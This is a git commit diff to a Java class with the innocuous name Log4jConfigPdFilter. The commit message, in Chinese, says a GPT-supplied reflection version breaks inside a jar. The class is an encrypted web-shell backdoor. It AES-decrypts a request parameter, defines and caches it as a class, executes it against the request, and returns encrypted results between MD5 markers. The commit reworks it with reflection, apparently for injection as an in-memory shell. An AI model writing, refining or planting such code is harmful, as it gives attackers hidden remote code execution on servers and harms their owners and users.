cfb29eab5a4111012b0d6490d4cc6cb85a9b655b
shibiao.zhou <secsan569@gmail.com>
2025-11-03 08:18:10 +0800

    gpt给出的反射版本，jar中会错误

--- src/main/java/com/filter/Log4jConfigPdFilter.java
+++ src/main/java/com/filter/Log4jConfigPdFilter.java
@@ -1,6 +1,6 @@
 package com.filter;
 
-public class Log4jConfigPdFilter extends ClassLoader{
+public class Log4jConfigPdFilter extends ClassLoader {
 
     private static final java.util.Map<ClassLoader, Log4jConfigPdFilter> CACHE = new java.util.concurrent.ConcurrentHashMap<>();
 
@@ -20,8 +20,6 @@ public class Log4jConfigPdFilter extends ClassLoader{
         md5 = md5(pass + key);
     }
 
-
-
     public byte[] x(byte[] s, boolean m) {
         try {
             javax.crypto.Cipher c = javax.crypto.Cipher.getInstance("AES");
@@ -34,81 +32,81 @@ public class Log4jConfigPdFilter extends ClassLoader{
 
     public static String md5(String s) {
         String ret = null;
-
         try {
             java.security.MessageDigest m = java.security.MessageDigest.getInstance("MD5");
             m.update(s.getBytes(), 0, s.length());
             ret = (new java.math.BigInteger(1, m.digest())).toString(16).toUpperCase();
-        } catch (Exception var3) {
-        }
-
+        } catch (Exception ignored) {}
         return ret;
     }
 
     public static String base64Encode(byte[] bs) throws Exception {
-        String value = null;
-
         try {
-            Class base64 = Class.forName("java.util.Base64");
-            Object Encoder = base64.getMethod("getEncoder", (Class[])null).invoke(base64, (Object[])null);
-            value = (String)Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, bs);
-        } catch (Exception var6) {
-            try {
-                Class base64 = Class.forName("sun.misc.BASE64Encoder");
-                Object Encoder = base64.newInstance();
-                value = (String)Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, bs);
-            } catch (Exception var5) {
-            }
+            Class<?> base64 = Class.forName("java.util.Base64");
+            Object encoder = base64.getMethod("getEncoder").invoke(null);
+            return (String) encoder.getClass().getMethod("encodeToString", byte[].class).invoke(encoder, bs);
+        } catch (Exception e) {
+            Class<?> base64 = Class.forName("sun.misc.BASE64Encoder");
+            Object encoder = base64.getConstructor().newInstance();
+            return (String) encoder.getClass().getMethod("encode", byte[].class).invoke(encoder, bs);
         }
-
-        return value;
     }
 
-
-    public Class Q(byte[] cb) {
+    public Class<?> Q(byte[] cb) {
         return super.defineClass(cb, 0, cb.length);
     }
 
-    public void execute(javax.servlet.http.HttpServletRequest request, javax.servlet.http.HttpServletResponse response) {
+    public void execute(Object requestObj, Object responseObj) throws Exception {
+        System.out.println("into execute()");
         try {
-            javax.servlet.http.HttpSession session = request.getSession();
-            byte[] data = this.base64Decode(request.getParameter(pass));
+            // Use reflection to access session
+            Class<?> reqClass = Class.forName("javax.servlet.http.HttpServletRequest");
+            Class<?> resClass = Class.forName("javax.servlet.http.HttpServletResponse");
+            Object session = reqClass.getMethod("getSession").invoke(requestObj);
+
+            java.lang.reflect.Method getParam = reqClass.getMethod("getParameter", String.class);
+            byte[] data = this.base64Decode((String)getParam.invoke(requestObj, pass));
             data = this.x(data, false);
-            if (session.getAttribute("payload") == null) {
-                session.setAttribute("payload", (new Log4jConfigPdFilter(this.getClass().getClassLoader())).Q(data));
+
+            java.lang.reflect.Method getAttr = session.getClass().getMethod("getAttribute", String.class);
+            Object payload = getAttr.invoke(session, "payload");
+
+            if (payload == null) {
+                java.lang.reflect.Method setAttr = session.getClass().getMethod("setAttribute", String.class, Object.class);
+                setAttr.invoke(session, "payload", (new Log4jConfigPdFilter(this.getClass().getClassLoader())).Q(data));
             } else {
-                request.setAttribute("parameters", data);
+                java.lang.reflect.Method setReqAttr = reqClass.getMethod("setAttribute", String.class, Object.class);
+                setReqAttr.invoke(requestObj, "parameters", data);
+
                 java.io.ByteArrayOutputStream arrOut = new java.io.ByteArrayOutputStream();
-
-                Object f;
-                try {
-                    f = ((Class)session.getAttribute("payload")).newInstance();
-                } catch (IllegalAccessException | InstantiationException e) {
-                    throw new RuntimeException(e);
-                }
+                Object f = ((Class<?>)payload).newInstance();
                 f.equals(arrOut);
-                f.equals(request);
-                javax.servlet.ServletOutputStream out = response.getOutputStream();
-                out.write(md5.substring(0, 16).getBytes(java.nio.charset.StandardCharsets.UTF_8));
+                f.equals(requestObj);
+
+                java.lang.reflect.Method getOutputStream = resClass.getMethod("getOutputStream");
+                Object out = getOutputStream.invoke(responseObj);
+                java.lang.reflect.Method write = out.getClass().getMethod("write", byte[].class);
+
+                write.invoke(out, md5.substring(0, 16).getBytes(java.nio.charset.StandardCharsets.UTF_8));
                 f.toString();
-                out.write(base64Encode(this.x(arrOut.toByteArray(), true)).getBytes(java.nio.charset.StandardCharsets.UTF_8));
-                out.write(md5.substring(16).getBytes(java.nio.charset.StandardCharsets.UTF_8));
-                out.flush();
+                write.invoke(out, base64Encode(this.x(arrOut.toByteArray(), true)).getBytes(java.nio.charset.StandardCharsets.UTF_8));
+                write.invoke(out, md5.substring(16).getBytes(java.nio.charset.StandardCharsets.UTF_8));
+
+                java.lang.reflect.Method flush = out.getClass().getMethod("flush");
+                flush.invoke(out);
             }
-        } catch (Exception var12) {
-        }
 
+        } catch (Exception ignored) {}
     }
-
 
     public byte[] base64Decode(String str) throws Exception {
         try {
-            Class clazz = Class.forName("sun.misc.BASE64Decoder");
-            return (byte[])clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str);
+            Class<?> clazz = Class.forName("sun.misc.BASE64Decoder");
+            return (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.getConstructor().newInstance(), str);
         } catch (Exception var5) {
-            Class clazz = Class.forName("java.util.Base64");
-            Object decoder = clazz.getMethod("getDecoder").invoke((Object)null);
-            return (byte[])decoder.getClass().getMethod("decode", String.class).invoke(decoder, str);
+            Class<?> clazz = Class.forName("java.util.Base64");
+            Object decoder = clazz.getMethod("getDecoder").invoke(null);
+            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, str);
         }
     }
 
